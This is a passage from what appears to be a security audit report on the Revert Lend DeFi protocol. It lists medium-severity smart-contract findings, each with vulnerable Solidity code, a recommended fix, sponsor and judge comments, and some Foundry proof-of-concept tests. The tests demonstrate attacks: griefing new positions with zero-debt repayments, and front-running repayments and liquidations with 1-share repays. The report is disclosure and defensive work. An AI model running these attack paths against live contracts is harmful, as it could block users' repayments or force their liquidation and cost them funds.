            revert Unauthorized();

        }


        (,, address token0, address token1,,,,,,,,) = nonfungiblePositionManager.positions(tokenId);


        uint256 balance0 = positionBalances[tokenId][token0];

        if (balance0 > 0) {

            _withdrawBalanceInternal(tokenId, token0, to, balance0, balance0);

        }

        uint256 balance1 = positionBalances[tokenId][token1];

        if (balance1 > 0) {

            _withdrawBalanceInternal(tokenId, token1, to, balance1, balance1);

        }

    }
As you can see in the first lines, if vaults[owner] = false, then owner must equal msg.sender, this will not be the case if the user has deposited their position to the Vault and hence cannot withdraw their balances.

Below is a POC for the above issue. Save this test case to file test/integration/automators/AutoCompound.t.sol and run it using command:

forge test --match-path test/integration/automators/AutoCompound.t.sol --match-test testTokenStuck -vvvv

function testTokenStuck() external {

        vm.prank(TEST_NFT_2_ACCOUNT);

        NPM.approve(address(autoCompound), TEST_NFT_2);


        (,,,,,,, uint128 liquidity,,,,) = NPM.positions(TEST_NFT_2);

        assertEq(liquidity, 80059851033970806503);

         vm.prank(OPERATOR_ACCOUNT);

        autoCompound.execute(AutoCompound.ExecuteParams(TEST_NFT_2, false, 0));

         (,,,,,,, liquidity,,,,) = NPM.positions(TEST_NFT_2);

        assertEq(liquidity, 99102324844935209920);


        // Mock call to  nonfungiblePositionManager.ownerOf to simulate

        // vault change

        // 0xC36442b4a4522E871399CD717aBDD847Ab11FE88 is the address of nonfungiblePositionManager

        // 0x6352211e is ERC721 function signature of `ownerOf`


        address vault = address(0x123);

        vm.mockCall(

            0xC36442b4a4522E871399CD717aBDD847Ab11FE88,(abi.encodeWithSelector(

            0x6352211e,TEST_NFT_2)

        ),

            abi.encode(vault)

        );


        // Withdraw leftover

        vm.prank(TEST_NFT_2_ACCOUNT);

        vm.expectRevert();

        autoCompound.withdrawLeftoverBalances(TEST_NFT_2, TEST_NFT_2_ACCOUNT);

        

    }
In this test case, I simulate the disabling of vault by mockCall the result of nonfungiblePositionManager.ownerOf(tokenId) to address(0x123), since this address is not vault then the condition vaults[owner] is false.

Recommended Mitigation Steps
I recommend checking the total user left tokens in variable positionBalances and only allow deactivating the current Vault if the number if zero.

Assessed type
Invalid Validation

kalinbas (Revert) confirmed and commented:

Agree this to be an issue. Probably will make whitelisting vaults in automators be a non-reversible action.

ronnyx2017 (judge) commented:

A temporary, mitigable DoS caused by normal administrative operations, so a valid Medium.

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-11] Lack of safety buffer in _checkLoanIsHealthy could subject users who take out the max loan into a forced liquidation
Submitted by CRYP70, also found by alix40, shaka, and atoko

The _checkLoanIsHealthy function is used in the V3Vault to assess a user’s given position and determine the health factor of the loan. As there is no safety buffer when checking the health factor of a given position, users could be subject to a negative health factor if there are minor movements in the market which could result in liquidation or in the worst case scenario, an attacker could force a liquidation on a user and profit by sinking their position in the Uniswap pool.

Vulnerability Details
The _checkLoanIsHealthy function holds the implementation to check if a users position is healthy and will return false if the position not able to be liquidated by obtaining the full value of the collateral inclusive of fees through the oracle by the tokenId . The collateralValue is then calculated from _calculateTokenCollateralFactorX32 . Finally, we return whether the collateralValue is greater than or equal to the debt requested:

    function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)

        internal

        view

        returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)

    {

        (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));


        uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);

        collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);

        isHealthy = collateralValue >= debt;

    }
However, the issue in the code is that the the start of the liquidation threshold (I.E. 85%) is supposed to be greater than the loan to value ratio (I.E. 80%) to create some breathing room for the user and reduce the risk of the protocol incurring bad debt.

Impact
Borrowers of the protocol may be unfairly liquidated due to minor movements in the market when taking out the max loan. In the worst case scenario, a user could be subject to a forced liquidation by the attacker (a malicious user or a bot) for profit.

Proof of Concept
The proof of concept below simulates a scenario where a user takes out a loan. The malicious user creates some small movements in the market in order to purposely sink a user’s position. The malicious user then liquidates the victim for profit forked from the Ethereum mainnet:

Details
Recommended Mitigation Steps
Consider implementing a safety buffer for the users position, which is considered when attempting to take out a loan so that they are not subject to liquidations due to minor changes in the market. For instance, if the liquidation threshold is at 80%, the borrower’s max loan is at 75% of that ratio. After some small changes in market conditions the position is now at a 75.00002% and is still safe from liquidations as it is still over collateralised. This can be done by implementing this as another state variable and checking that the requested debt is initially below this threshold. When attempting to liquidate, the health of the position is then checked against the liquidation threshold.

kalinbas (Revert) disputed and commented:

It’s a design choice and we probably will add a safety buffer on the frontend. But in contract it is not needed.

ronnyx2017 (judge) decreased severity to Medium and commented:

I think this is a valid Medium, as typically the safety measures added at the frontend are considered unreliable. I don’t quite understand the significant benefits of the current design; it only slightly increases capital efficiency but exposes users to liquidation risks.

kalinbas (Revert) confirmed and commented:

Agreed. Will add this safety buffer

Revert mitigated:

PR here - added safety buffer for borrow and decreaseLiquidity (not for transformers).

Status: Mitigation confirmed. Full details in reports from thank_you and b0g0.

[M-12] Wrong global lending limit check in _deposit function
Submitted by Aymen0909, also found by linmiaomiao, KupiaSec, befree3x, pynschon, kennedy1030, and Topmark

The _deposit function is invoked in both the deposit and mint functions when a user wants to lend assets. This function is intended to ensure that the total amount of assets lent does not exceed the protocol limit globalLendLimit.

function _deposit(

    address receiver,

    uint256 amount,

    bool isShare,

    bytes memory permitData

) internal returns (uint256 assets, uint256 shares) {

    ...


    _mint(receiver, shares);


    //@audit must convert totalSupply() to assets before comparing with globalLendLimit

    if (totalSupply() > globalLendLimit) {

        revert GlobalLendLimit();

    }


    if (assets > dailyLendIncreaseLimitLeft) {

        revert DailyLendIncreaseLimit();

    } else {

        dailyLendIncreaseLimitLeft -= assets;

    }

    ...

}
In the provided code snippet, the _deposit function checks the totalSupply() against the globalLendLimit limit. However, totalSupply() represents the lenders’ share amount and does not represent the actual asset amount lent. It must first be converted to assets using the _convertToAssets function.

This mistake is evident because in the maxDeposit function, the correct check is implemented:

function maxDeposit(address) external view override returns (uint256) {

    (, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;

    uint256 value = _convertToAssets(

        totalSupply(),

        lendExchangeRateX96,

        Math.Rounding.Up

    );

    if (value >= globalLendLimit) {

        return 0;

    } else {

        return globalLendLimit - value;

    }

}
Because the _deposit function performs the wrong check, it will allow more assets to be lent in the protocol. This is due to the fact that the lending exchange rate lastLendExchangeRateX96 will be greater than 1 (due to interest accrual), and so we will always have totalSupply() < _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up). The only case this might not hold is when there is a significant bad debt after liquidation, which would not occur under normal circumstances.

Impact
Incorrect global lending checking in the _deposit function will result in more assets being lent than allowed by the protocol.

Tools Used
VS Code

Recommended Mitigation
To address this issue, the totalSupply() must be converted to an asset amount before checking it against globalLendLimit, as is done in the maxDeposit function:

function _deposit(

    address receiver,

    uint256 amount,

    bool isShare,

    bytes memory permitData

) internal returns (uint256 assets, uint256 shares) {

    ...


    _mint(receiver, shares);


++  //@audit must convert totalSupply() to assets before comparing with globalLendLimit

++  uint256 value = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up);

++  if (value > globalLendLimit) {

--  if (totalSupply() > globalLendLimit) {

        revert GlobalLendLimit();

    }


    if (assets > dailyLendIncreaseLimitLeft) {

        revert DailyLendIncreaseLimit();

    } else {

        dailyLendIncreaseLimitLeft -= assets;

    }

    ...

}
Assessed type
Error

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Unmitigated. Full details in reports from thank_you, b0g0 and ktg, and also included in the Mitigation Review section below.

[M-13] User might execute PositionToken of token set by previous token owner
Submitted by cryptphi

The AutoRange.configToken() function updates the state variable positionConfigs for a tokenId and callable by the owner of the tokenId. However, in the call to AutoRange.execute(), the state variable positionConfigs for the tokenId is used in setting the local variable PositionConfig memory config without any further check to ensure the config has been set by the current owner of the tokenId.

This in some way could affect the swapcall on the token position such that the protocol does not receive any incentive.

Proof of Concept
Alice is an operator and owns token 1 and sets the configToken() to configure token to be used before calling executeWithVault().
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L276-L297

positionConfigs state variable for tokenId is set in configToken() by token owner:

function configToken(uint256 tokenId, address vault, PositionConfig calldata config) external {

        _validateOwner(tokenId, vault);


        // lower tick must be always below or equal to upper tick - if they are equal - range adjustment is deactivated

        if (config.lowerTickDelta > config.upperTickDelta) {

            revert InvalidConfig();

        }


        positionConfigs[tokenId] = config;
After a while and eventually Alice no longer has any position on token and transfers the token to Bob.
Bob is another operator and calls executeWithVault(); the calls happen using the old token config set by Alice.
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L111-L116

positionConfigs[tokenId] set by a previous tokenId owner being used:

function execute(ExecuteParams calldata params) external {

        if (!operators[msg.sender] && !vaults[msg.sender]) {

            revert Unauthorized();

        }

        ExecuteState memory state;

        PositionConfig memory config = positionConfigs[params.tokenId];
Recommended Mitigation Steps
Using an enumerable set or additional mapping parameter to set the current owner in the positionConfigs state variable and an additional check in execute() to ensure the config was set by token owner.

kalinbas (Revert) acknowledged and commented:

Position config is not reset when transferring a position to someone else, but the operator approval/approvalforall is reset. So the position can’t be automated anymore, and if it is given approval, the revert UI will also let the user set the new config. So this is valid but not a problem.

ronnyx2017 (judge) commented:

Makes sense. I also believe that frontend security checks are unreliable, so I’m still maintaining it as an Medium.

[M-14] V3Vault is not ERC-4626 compliant
Submitted by Limbooo, also found by falconhoof, btk, 14si2o_Flint, wangxx2026, Silvermist, Aymen0909, shaka, jnforja, crypticdefense, erosjohn, 0xspryon, y0ng0p3 (1, 2), 0xDemon, and alix40

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L301-L309

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L312-L320

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L323-L326

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L329-L331

Impact
Protocols that try to integrate with Revert Lend, expecting V3Vault to be ERC-4626 compliant, will multiple issues that may damage Revert Lend’s brand and limit Revert Lend’s growth in the market.

Proof of Concept
All official ERC-4626 requirements are on their official page. Non-compliant methods are listed below along with why they are not compliant and coded POCs demonstrating the issues.

V3Vault::maxDeposit and V3Vault::maxMint
As specified in ERC-4626, both maxDeposit and maxMint must return the maximum amount that would allow to be used and not cause a revert. Also, if the deposits or mints are disabled at current moment, it MUST return 0.

ERC4626::maxDeposit Non-compliant requirements
MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.

ERC4626::maxMint Non-compliant requirements
MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.

However, in both V3Vault::maxDeposit or V3Vault::maxMint returns the amount that causes a revert in deposit or mint. This is because they do not check if the amount exceeded the daily lend limit and if this is a case, it will cause a revert inside _deposit function (where it used in both deposit and mint):

src/V3Vault.sol:

915:         if (assets > dailyLendIncreaseLimitLeft) {

916:             revert DailyLendIncreaseLimit();

917:         } else {
Furthermore, when dailyLendIncreaseLimitLeft == 0 that means the deposits and mints are temporarily disabled, while both V3Vault::maxDeposit and V3Vault::maxMint could return amounts that is more than 0. Based on ERC4626 requirements, it MUST return 0 in this case.

Test Case (Foundry)
To run the POC, copy-paste it into V3Vault.t.sol:

    function testPOC_MaxDepositDoesNotReturnZeroWhenExceedsDailyLimit() public {

        uint256 dailyLendIncreaseLimitMin = vault.dailyLendIncreaseLimitMin();

        uint256 depositAmount = dailyLendIncreaseLimitMin;


        vm.startPrank(WHALE_ACCOUNT);

        USDC.approve(address(vault), depositAmount);

        vault.deposit(depositAmount, WHALE_ACCOUNT);


        //Should return 0 to comply to ERC-4626.

        assertNotEq(vault.maxDeposit(address(WHALE_ACCOUNT)), 0);


        USDC.approve(address(vault), 1);

        vm.expectRevert(IErrors.DailyLendIncreaseLimit.selector);

        vault.deposit(1, WHALE_ACCOUNT);


        vm.stopPrank();

    }
V3Vault::maxWithdraw and V3Vault::maxRedeem
As specified in ERC-4626, both maxWithdraw and maxRedeem must return the maximum amount that would allow to be  transferred from owner and not cause a revert. Also, if the withdrawals or redemption are disabled at current moment, it MUST return 0.

ERC4626::maxWithdraw Non-compliant requirements
MUST return the maximum amount of assets that could be transferred from owner through withdraw and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

ERC4626::maxRedeem Non-compliant requirements
MUST return the maximum amount of shares that could be transferred from owner through redeem and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.

However, in both V3Vault::maxWithdraw or V3Vault::maxRedeem returns the amount that causes a revert in withdraw or redeem. This is because they do not check if the amount exceeded the current available balance in the vault and if this is a case, it will cause a revert inside _withdraw function (where it used in both withdraw and redeem):

src/V3Vault.sol:

962:         (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);

963:         if (available < assets) {

964:             revert InsufficientLiquidity();

965:         }
Test Case (Foundry)
To run the POC, copy-paste it into V3Vault.t.sol:

    function testPOC_MaxWithdrawDoesNotReturnZeroWhenExceedsAvailableBalance() external {

        // maximized collateral loan

        _setupBasicLoan(true);


        uint256 amount = vault.maxRedeem(address(WHALE_ACCOUNT));


        (,,, uint256 available,,,) = vault.vaultInfo();


        //Should return available balance if it is less than owner balance to comply to ERC-4626.

        assertNotEq(vault.maxRedeem(address(WHALE_ACCOUNT)), available);


        vm.expectRevert(IErrors.InsufficientLiquidity.selector);

        vm.prank(WHALE_ACCOUNT);

        vault.redeem(amount, WHALE_ACCOUNT, WHALE_ACCOUNT);

    }
Recommended Mitigation Steps
To address the non-compliance issues, the following changes are recommended:

diff --git a/src/V3Vault.sol b/src/V3Vault.sol

index 64141ec..a25cebd 100644

--- a/src/V3Vault.sol

+++ b/src/V3Vault.sol

@@ -304,7 +304,12 @@ contract V3Vault is ERC20, Multicall, Ownable, IVault, IERC721Receiver, IErrors

         if (value >= globalLendLimit) {

             return 0;

         } else {

-            return globalLendLimit - value;

+            uint256 maxGlobalDeposit = globalLendLimit - value;

+            if (maxGlobalDeposit > dailyLendIncreaseLimitLeft) {

+                return dailyLendIncreaseLimitLeft;

+            } else {

+                return maxGlobalDeposit;

+            }

         }

     }


@@ -315,19 +320,37 @@ contract V3Vault is ERC20, Multicall, Ownable, IVault, IERC721Receiver, IErrors

         if (value >= globalLendLimit) {

             return 0;

         } else {

-            return _convertToShares(globalLendLimit - value, lendExchangeRateX96, Math.Rounding.Down);

+            uint256 maxGlobalDeposit = globalLendLimit - value;

+            if (maxGlobalDeposit > dailyLendIncreaseLimitLeft) {

+                return _convertToShares(dailyLendIncreaseLimitLeft, lendExchangeRateX96, Math.Rounding.Down);

+            } else {

+                return _convertToShares(maxGlobalDeposit, lendExchangeRateX96, Math.Rounding.Down);

+            }

         }

     }


     /// @inheritdoc IERC4626

     function maxWithdraw(address owner) external view override returns (uint256) {

-        (, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;

-        return _convertToAssets(balanceOf(owner), lendExchangeRateX96, Math.Rounding.Down);

+        uint256 ownerBalance = balanceOf(owner);

+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;

+        (, uint256 available, ) = _getAvailableBalance(debtExchangeRateX96, lendExchangeRateX96);

+        if (available > ownerBalance) {

+            return _convertToAssets(ownerBalance, lendExchangeRateX96, Math.Rounding.Down);

+        } else {

+            return _convertToAssets(available, lendExchangeRateX96, Math.Rounding.Down);

+        }

     }


     /// @inheritdoc IERC4626

     function maxRedeem(address owner) external view override returns (uint256) {

-        return balanceOf(owner);

+        uint256 ownerBalance = balanceOf(owner);

+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = `_calculateGlobalInterest()`;

+        (, uint256 available, ) = _getAvailableBalance(debtExchangeRateX96, lendExchangeRateX96);

+        if (available > ownerBalance) {

+            return ownerBalance;

+        } else {

+            return available;

+        }

     }
The modified maxDeposit function now correctly calculates the maximum deposit amount by considering both the global lend limit and the daily lend increase limit. If the calculated maximum global deposit exceeds the daily lend increase limit, the function returns the daily lend increase limit to comply with ERC-4626 requirements.

Similarly, the modified maxMint ensures compliance with ERC-4626 by calculating the maximum mints amount for a given owner. It considers both the global lend limit and the daily lend increase limit as mentioned in maxDeposit.

The modified maxWithdraw function now correctly calculates the maximum withdrawal amount for a given owner. It ensures that the returned value does not exceed the available balance in the vault. If the available balance is greater than the owner’s balance, it returns the owner’s balance, otherwise it return the available balance to prevent potential reverts during withdrawal transactions. This adjustment aligns with ERC-4626 requirements by ensuring that withdrawals do not cause unexpected reverts and accurately reflect the available funds for withdrawal.

Similarly, the modified maxRedeem function ensures compliance with ERC-4626 by calculating the maximum redemption amount for a given owner. It considers both the owner’s balance and the available liquidity in the vault as mentioned in maxWithdraw.

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation Confirmed. Full details in the report from thank_you.

[M-15] Users’ newly created positions can be prematurely closed and removed from the vault directly after they are created
Submitted by JCN, also found by 0xPhantom

A user can create a position by calling the create function or by simply sending the NFT to the vault via safeTransferFrom. Both of those methods will trigger the V3Vault::onERC721Received function:

V3Vault::onERC721Received

446:            loans[tokenId] = Loan(0);

447:

448:            _addTokenToOwner(owner, tokenId); // @audit: NFT added to storage
The loan for this position (loans[tokenId]) is instantiated with 0 debt and the NFT is added to storage:

V3Vault::_addTokenToOwner

1297:    function _addTokenToOwner(address to, uint256 tokenId) internal {

1298:        ownedTokensIndex[tokenId] = ownedTokens[to].length;

1299:        ownedTokens[to].push(tokenId);

1300:        tokenOwner[tokenId] = to; // @audit: to == user address

1301:    }
At this point, the user has only instantiated their position and has not borrowed against it, meaning the position’s debt is 0. Additionally, the V3Vault::_repay function does not require the amount to repay a position’s debt to be non-zero. Thus, the following will occur when a malicious actor repays the non-existent debt of the newly created position with 0 value:

V3Vault::_repay

954:    function _repay(uint256 tokenId, uint256 amount, bool isShare, bytes memory permitData) internal {

955:        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

956:

957:        Loan storage loan = loans[tokenId];

958:

959:        uint256 currentShares = loan.debtShares; // @audit: 0, newly instantiated

960:

961:        uint256 shares;

962:        uint256 assets;

963:

964:        if (isShare) {

965:            shares = amount; // @audit: amount == 0

966:            assets = _convertToAssets(amount, newDebtExchangeRateX96, Math.Rounding.Up);

967:        } else {

968:            assets = amount; // @audit: amount == 0

969:            shares = _convertToShares(amount, newDebtExchangeRateX96, Math.Rounding.Down);

970:        }

971:

972:        // fails if too much repayed

973:        if (shares > currentShares) { // @audit: 0 == 0

974:            revert RepayExceedsDebt();

975:        }

...

990:        uint256 loanDebtShares = loan.debtShares - shares; // @audit: null storage operations

991:        loan.debtShares = loanDebtShares;

992:        debtSharesTotal -= shares;

...

1001:        address owner = tokenOwner[tokenId]; // @audit: user's address

1002:

1003:        // if fully repayed

1004:        if (currentShares == shares) { // @audit: 0 == 0

1005:            _cleanupLoan(tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, owner); // @audit: remove NFT from storage and send NFT back to user
As we can see above, repaying an empty position with 0 amount will result in the protocol believing that the loan is being fully repaid (see line 1004). Therefore, the _cleanupLoan internal function will be invoked, which will remove the position from storage and send the NFT back to the user:

V3Vault::_cleanupLoan

1077:    function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)

1078:        internal

1080:    {

1081:        _removeTokenFromOwner(owner, tokenId); // @audit: remove NFT from storage

1082:        _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0); // @audit: noop

1083:        delete loans[tokenId]; // @audit: noop

1084:        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId); // @audit: transfer NFT back to user
Since the user’s NFT is no longer in the vault, any attempts by the user to borrow against the prematurely removed position will result in a revert since the position is now non-existent.

Impact
Users’ newly created positions can be prematurely removed from the vault before the users can borrow against that position. This would result in the user wasting gas as they attempt to borrow against a non-existence position and are then forced to re-create the position.

Note that sophisticated users are able to bypass this griefing attack by submitting the create and borrow calls in one transaction. However, seeing as there are explicit functions used to first create a position and then to borrow against it, average users can be consistently griefed when they follow this expected flow.

Proof of Concept
Place the following test inside of the V3Vault.t.sol and run with forge test --mc V3VaultIntegrationTest --mt testGriefNewPosition:

    function testGriefNewPosition() public {

        // set up attacker

        address attacker = address(0x01010101);


        // --- user creates new position --- //

        _setupBasicLoan(false);


        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);

        assertEq(collateralValue, 8847206);

        assertEq(fullValue, 9830229);

        

        assertEq(address(vault), NPM.ownerOf(TEST_NFT)); // NFT sent to vault

        

        // --- user attempts to borrow against position, but gets griefed by attacker --- //


        // attacker repays 0 debt for position and removes position

        vm.prank(attacker);

        vault.repay(TEST_NFT, 0, false);


        assertEq(TEST_NFT_ACCOUNT, NPM.ownerOf(TEST_NFT)); // NFT sent back to user


        // user attempts to borrow with new position, but tx reverts

        vm.prank(TEST_NFT_ACCOUNT);

        vm.expectRevert(IErrors.Unauthorized.selector);

        vault.borrow(TEST_NFT, collateralValue);

    }
Recommended Mitigation Steps
I would recommend validating the amount parameter in the repay function and reverting if amount == 0. Additionally, there can be an explicit reversion if the loan attempting to be repaid currently has 0 debt.

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here and here.

Status: Mitigation Confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-16] Repayments and liquidations can be forced to revert by an attacker that repays minuscule amount of shares
Submitted by kfx, also found by kinda_very_good, zxriptor, CaeraDenoir, grearlake (1, 2), falconhoof, 0x175, JohnSmith, Giorgio, JecikPo, jnforja, SpicyMeatball, shaka, givn, Aymen0909, AMOW, atoko, Norah, alexander_orjustalex, JCN (1, 2), web3Tycoon, erosjohn, lanrebayode77, nmirchev8, 0xjuan, and 0xAlix2

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L696-L698

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L973-L975

Impact
At the moment, both repay and liquidate calls will fail if the amount of shares that the transaction attempts to repay exceeds the outstanding debt shares of the position, with RepayExceedsDebt and DebtChanged errors respectively.

This enables an attacker to keep repaying very small amounts, such as 1 share, of the debt, causing user/liquidator transactions to fail.

The attack exposes risks for users who are close to the liquidation theshold from increasing their position’s health, and also from self-liquidating their positions once they’re already below the threshold.

Proof of Concept
    function testRepaymentFrontrun() external {

        address attacker = address(0xa1ac4e5);


        _setupBasicLoan(true);


        vm.prank(WHALE_ACCOUNT);

        USDC.approve(address(vault), type(uint256).max);


        vm.prank(WHALE_ACCOUNT);

        USDC.transfer(address(attacker), 1e12);


        vm.prank(attacker);

        USDC.approve(address(vault), type(uint256).max);

        

        // wait 7 day - interest growing

        vm.warp(block.timestamp + 7 days);


        uint256 debtShares = vault.loans(TEST_NFT);


        vm.prank(attacker);

        vault.repay(TEST_NFT, 1, true); // repay 1 share


        // user's repayment fails

        vm.prank(WHALE_ACCOUNT);

        vm.expectRevert(IErrors.RepayExceedsDebt.selector);

        vault.repay(TEST_NFT, debtShares, true); // try to repay all shares


        // attacker (or someone else) can liquidate the position now

        vm.prank(attacker);

        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares - 1, 0, 0, attacker, ""));

    }



    function testLiquidationFrontrun() external {

        address attacker = address(0xa1ac4e5);


        _setupBasicLoan(true);


        vm.prank(WHALE_ACCOUNT);

        USDC.approve(address(vault), type(uint256).max);


        vm.prank(WHALE_ACCOUNT);

        USDC.transfer(address(attacker), 1e12);


        vm.prank(attacker);

        USDC.approve(address(vault), type(uint256).max);

               

        // wait 7 day - interest growing

        vm.warp(block.timestamp + 7 days);


        uint256 debtShares = vault.loans(TEST_NFT);


        vm.prank(attacker);

        vault.repay(TEST_NFT, 1, true); // repay 1 share


        // user's self-liquidation fails

        vm.prank(WHALE_ACCOUNT);

        vm.expectRevert(IErrors.DebtChanged.selector);

        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));

    }
Recommended Mitigation Steps
Allow to attempt to repay an unlimited amount of shares. Send back to the user tokens that were not required for the full repayment.

Assessed type
DoS

kalinbas (Revert) confirmed

ronnyx2017 (judge) commented:

The attack vector includes MEV as a necessary condition.

Revert mitigated:

Fixed here and here.

Status: Mitigation Confirmed. Full details in reports from b0g0, thank_you and ktg.

[M-17] AutoExit could receive a reward calculated from the entire position’s fund even if onlyFee is true in AutoExit.execute()
Submitted by kennedy1030, also found by deepplus and KupiaSec

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L100-L214

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L193-L215

Impact
The owner of the NFT could end up paying more rewards to AutoExit than anticipated when onlyFee is set to true.

Proof of Concept
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L155

    function execute(ExecuteParams calldata params) external {

        [...]


            // reward is taken before swap - if from fees only

            if (config.onlyFees) {

155             state.amount0 -= state.feeAmount0 * params.rewardX64 / Q64;

                state.amount1 -= state.feeAmount1 * params.rewardX64 / Q64;

            }


        [...]

    }
https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L208

    function _decreaseFullLiquidityAndCollect(

        uint256 tokenId,

        uint128 liquidity,

        uint256 amountRemoveMin0,

        uint256 amountRemoveMin1,

        uint256 deadline

    ) internal returns (uint256 amount0, uint256 amount1, uint256 feeAmount0, uint256 feeAmount1) {

        if (liquidity > 0) {

            // store in temporarily "misnamed" variables - see comment below

202         (feeAmount0, feeAmount1) = nonfungiblePositionManager.decreaseLiquidity(

                INonfungiblePositionManager.DecreaseLiquidityParams(

                    tokenId, liquidity, amountRemoveMin0, amountRemoveMin1, deadline

                )

            );

        }

208     (amount0, amount1) = nonfungiblePositionManager.collect(

            INonfungiblePositionManager.CollectParams(tokenId, address(this), type(uint128).max, type(uint128).max)

        );


        // fee amount is what was collected additionally to liquidity amount

        feeAmount0 = amount0 - feeAmount0;

        feeAmount1 = amount1 - feeAmount1;

    }
As seen at L208, feeAmount represents the uncollected fees excluding assets from the current liquidity. However, it includes the owed amount, which comprises uncollected assets not just from fees but also from nonfungiblePositionManager.decreaseLiquidity() called earlier at L202. If the owner has already executed nonfungiblePositionManager.decreaseLiquidity(), the uncollected assets would consist of some assets withdrawn from their liquidity, possibly a significant portion. This implies that onlyFee configuration is not functioning effectively.

Here is a simple scenario to highlight this issue:

The owner invokes nonfungiblePositionManager.approve(address(autoExit), NFT) and sets onlyFee to true.
The owner then calls nonfungiblePositionManager.decreaseLiquidity() to withdraw the majority of their liquidity..
Subsequently, an operator calls autoExit.execute() and receives more rewards than anticipated.
Recommended Mitigation Steps
In Automator._decreaseFullLiquidityAndCollect(), feeAmount0, feeAmount1 must only include the amount calculated from the feeGrowthInside of UniswapV3 position.

mariorz (Revert) acknowledged, but disagreed with severity and commented:

Don’t believe this should be a “high risk”.

Users calling decreaseLiquidity without calling collect is possible but non-standard and there is no real reason to do this.
If this ever happened by some edge case, the Operator is an approved role that would be incentivized to return the extra fees to the affected user.
There is no risk for other lenders or borrowers.
Risk for the affected LP is limited to <2% of the position value.
ronnyx2017 (judge) decreased severity to Medium and commented:

More like user error or a malicious operator.

[M-18] Users cannot stop loss in AutoRange and AutoExit
Submitted by ktg

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L151-L153

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L162-L169

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L157-L164

Impact
Users cannot stop loss in AutoRange and AutoExit, resulting in huge loss.
Users cannot withdraw their tokens and cut loss even when they choose no swap option.
Proof of Concept
Contract AutoRange and AutoExit both inherits contract Automator and uses its function _validateSwap:

function _validateSwap(

        bool swap0For1,

        uint256 amountIn,

        IUniswapV3Pool pool,

        uint32 twapPeriod,

        uint16 maxTickDifference,

        uint64 maxPriceDifferenceX64

    ) internal view returns (uint256 amountOutMin, int24 currentTick, uint160 sqrtPriceX96, uint256 priceX96) {

        // get current price and tick

        (sqrtPriceX96, currentTick,,,,,) = pool.slot0();


        // check if current tick not too far from TWAP

        if (!_hasMaxTWAPTickDifference(pool, twapPeriod, currentTick, maxTickDifference)) {

            revert TWAPCheckFailed();

        }

....


 function _hasMaxTWAPTickDifference(IUniswapV3Pool pool, uint32 twapPeriod, int24 currentTick, uint16 maxDifference)

        internal

        view

        returns (bool)

    {

        (int24 twapTick, bool twapOk) = _getTWAPTick(pool, twapPeriod);

        if (twapOk) {

            return twapTick - currentTick >= -int16(maxDifference) && twapTick - currentTick <= int16(maxDifference);

        } else {

            return false;

        }

    }


...



